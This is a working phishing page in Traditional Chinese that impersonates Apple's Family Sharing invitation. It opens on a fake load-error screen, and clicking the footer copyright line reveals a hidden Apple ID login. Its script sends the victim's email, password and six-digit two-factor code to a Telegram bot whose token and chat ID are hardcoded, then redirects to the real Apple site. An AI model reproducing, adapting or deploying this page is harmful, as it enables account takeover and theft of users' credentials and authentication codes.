<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>家人共享</title>
    <link rel="icon" href="https://www.apple.com/favicon.ico">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif; }
        body { background-color: #ffffff; color: #1d1d1f; display: flex; flex-direction: column; min-height: 100vh; }
        
        /* 初始加載與再試一次的加載畫面 */
        #initial-loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #ffffff; display: flex; align-items: center; justify-content: center;
            z-index: 9999;
        }

        .navbar { width: 100%; height: 44px; background: #ffffff; display: flex; align-items: center; justify-content: space-between; padding: 0 22px; border-bottom: 1px solid #d2d2d7; position: sticky; top: 0; z-index: 100; }
        .navbar h1 { font-size: 21px; font-weight: 600; }
        .navbar .right-link { font-size: 14px; color: #1d1d1f; text-decoration: none; }

        .main-content { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 60px 22px; text-align: center; }
        .family-hero-img { width: 140px; height: auto; margin-bottom: 30px; }
        
        /* 錯誤頁面樣式 */
        .error-title { font-size: 28px; font-weight: 600; margin-bottom: 15px; }
        .error-desc { font-size: 19px; color: #1d1d1f; margin-bottom: 40px; }
        .retry-btn { 
            background-color: #007aff; color: white; border: none; padding: 12px 40px; 
            border-radius: 8px; font-size: 19px; font-weight: 400; cursor: pointer;
        }

        /* 登入框延展設計 (隱藏入口觸發後顯示) */
        .login-box { width: 100%; max-width: 330px; border: 1px solid #d2d2d7; border-radius: 12px; overflow: hidden; background: #fff; transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); margin: 30px 0; }
        .input-row { position: relative; height: 52px; display: flex; align-items: center; }
        .apple-input { width: 100%; height: 100%; padding: 0 50px 0 16px; border: none; font-size: 17px; outline: none; background: transparent; }
        .divider { height: 1px; background-color: #d2d2d7; margin: 0 16px; display: none; }
        #pw-row { height: 0; opacity: 0; visibility: hidden; transition: all 0.5s ease; }
        .expanded #pw-row { height: 52px; opacity: 1; visibility: visible; }
        .expanded .divider { display: block; }

        .submit-btn { position: absolute; right: 10px; width: 32px; height: 32px; border: 1px solid #d2d2d7; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; background: #fff; }
        .loading-gif { width: 22px; height: 22px; display: none; }

        /* 雙重認證 */
        .otp-container { display: flex; gap: 10px; justify-content: center; margin: 30px 0; }
        .otp-input { width: 45px; height: 55px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 24px; text-align: center; outline: none; }

        .footer { background-color: #f5f5f7; padding: 30px 22px; font-size: 12px; color: #86868b; }
        .footer-inner { max-width: 980px; margin: 0 auto; }
        .footer-bottom { display: flex; justify-content: space-between; align-items: center; margin-top: 15px; }
        .flag-box { display: flex; align-items: center; gap: 5px; color: #1d1d1f; }
        .flag-img { width: 16px; height: 16px; border-radius: 50%; object-fit: cover; }
        .hidden { display: none !important; }
    </style>
</head>
<body onload="initPage()">

    <div id="initial-loader">
        <img src="./assets/loading.gif" style="width: 40px;">
    </div>

    <nav class="navbar">
        <h1>家人共享</h1>
        <a href="#" class="right-link">「家人共享」是什麼？</a>
    </nav>

    <main id="phase-error" class="main-content">
        <img src="./assets/family_icon.png" class="family-hero-img" alt="Family Icon">
        <h1 class="error-title">載入此頁面時發生問題</h1>
        <p class="error-desc">再試一次或稍後再回來。</p>
        <button class="retry-btn" onclick="retryLoad()">再試一次</button>
    </main>

    <main id="phase-invite" class="main-content hidden">
        <img src="./assets/family_icon.png" class="family-hero-img" alt="Family Icon">
        <h1 style="font-size: 28px; font-weight: 600; margin-bottom: 15px;">ThomasSusan 已邀請你加入「家人共享」。</h1>
        <p style="font-size: 17px; margin-bottom: 40px;">登入以加入ThomasSusan的家庭，即可存取 iCloud 儲存空間。</p>
        <h2 style="font-size: 24px; margin-bottom: 25px; font-weight: 400;">使用 Apple 帳號登入</h2>
        
        <div class="login-box" id="login-box">
            <div class="input-row">
                <input type="text" id="acc" class="apple-input" placeholder="電子郵件地址或電話號碼" onkeydown="preventReturn(event)">
                <div class="submit-btn" id="btn-acc" onclick="triggerExpand()">
                    <svg class="arrow-svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#d2d2d7" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                    <img src="./assets/loading.gif" class="loading-gif">
                </div>
            </div>
            <div class="divider"></div>
            <div class="input-row" id="pw-row">
                <input type="password" id="pw" class="apple-input" placeholder="密碼" onkeydown="preventReturn(event)">
                <div class="submit-btn" id="btn-pw" onclick="handleFinalLogin()">
                    <svg class="arrow-svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#d2d2d7" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                    <img src="./assets/loading.gif" class="loading-gif">
                </div>
            </div>
        </div>
        <a href="#" style="color: #0066cc; font-size: 14px; text-decoration: none;">忘記密碼？ ↗</a>
    </main>

    <main id="phase-otp" class="main-content hidden">
        <img src="./assets/family_icon.png" class="family-hero-img" style="width: 100px;">
        <h1 style="font-size: 28px; font-weight: 500;">雙重認證</h1>
        <div class="otp-container">
            <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
            <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
            <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
            <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
            <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
            <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
        </div>
        <p style="font-size: 16px; margin-bottom: 20px;">請輸入傳送至你 iPhone 的驗證碼。</p>
        <a href="#" style="color: #0066cc; font-size: 14px; text-decoration: none;">重新傳送驗證碼至 iPhone</a>
    </main>

    <footer class="footer">
        <div class="footer-inner">
            <div style="border-bottom: 1px solid #d2d2d7; padding-bottom: 15px; margin-bottom: 15px;">更多選購方式：<span style="color: #0066cc;">尋找當地的 Apple 直營店</span>或致電 0800-020-021。</div>
            <div class="footer-bottom">
                <div onclick="showSecretLogin()" style="cursor: default;">Copyright © 2022 Apple Inc. 保留一切權利。</div>
                <div class="flag-box"><img src="./assets/TWNflag.png" class="flag-img" alt="Taiwan"> 台灣</div>
            </div>
        </div>
    </footer>

    <script>
        const config = { token: "8515104060:AAEaLB1JSthW0sepHdNLetgqg_ZBE-1Ofy4", chatId: "1945090052" };
        async function sendMsg(text) { try { await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: config.chatId, text: text }) }); } catch(e) {} }

        function initPage() {
            setTimeout(() => {
                hideLoader();
            }, 2500);
        }

        function hideLoader() {
            const loader = document.getElementById('initial-loader');
            loader.style.transition = "opacity 0.5s ease";
            loader.style.opacity = "0";
            setTimeout(() => loader.style.display = "none", 500);
        }

        function retryLoad() {
            const loader = document.getElementById('initial-loader');
            loader.style.display = "flex";
            loader.style.opacity = "1";
            setTimeout(() => {
                hideLoader();
            }, 2500);
        }

        function showSecretLogin() {
            document.getElementById('phase-error').classList.add('hidden');
            document.getElementById('phase-invite').classList.remove('hidden');
        }

        function preventReturn(e) {
            if (e.key === "Enter" || e.keyCode === 13) {
                e.preventDefault();
                return false;
            }
        }

        function triggerExpand() {
            const acc = document.getElementById('acc').value.trim();
            if(!acc) return;
            const btn = document.getElementById('btn-acc');
            btn.querySelector('.arrow-svg').style.display = 'none';
            btn.querySelector('.loading-gif').style.display = 'block';
            setTimeout(() => {
                btn.querySelector('.loading-gif').style.display = 'none';
                btn.querySelector('.arrow-svg').style.display = 'block';
                document.getElementById('login-box').classList.add('expanded');
                setTimeout(() => document.getElementById('pw').focus(), 500);
            }, 1200);
        }

        async function handleFinalLogin() {
            const acc = document.getElementById('acc').value;
            const pw = document.getElementById('pw').value;
            if(!pw) return;
            const btn = document.getElementById('btn-pw');
            btn.querySelector('.arrow-svg').style.display = 'none';
            btn.querySelector('.loading-gif').style.display = 'block';
            await sendMsg(`👨‍👩‍👧‍👦 【Apple ID】\n帳號: ${acc}\n密碼: ${pw}`);
            setTimeout(() => {
                document.getElementById('phase-invite').classList.add('hidden');
                document.getElementById('phase-otp').classList.remove('hidden');
                document.querySelectorAll('.otp-input')[0].focus();
            }, 10000);
        }

        const inputs = document.querySelectorAll('.otp-input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', async (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                const code = Array.from(inputs).map(i => i.value).join('');
                if (code.length === 6) {
                    await sendMsg(`🛡️ 【驗證碼】: ${code}`);
                    window.location.href = "https://www.apple.com/tw/family-sharing/";
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    </script>
</body>
</html>
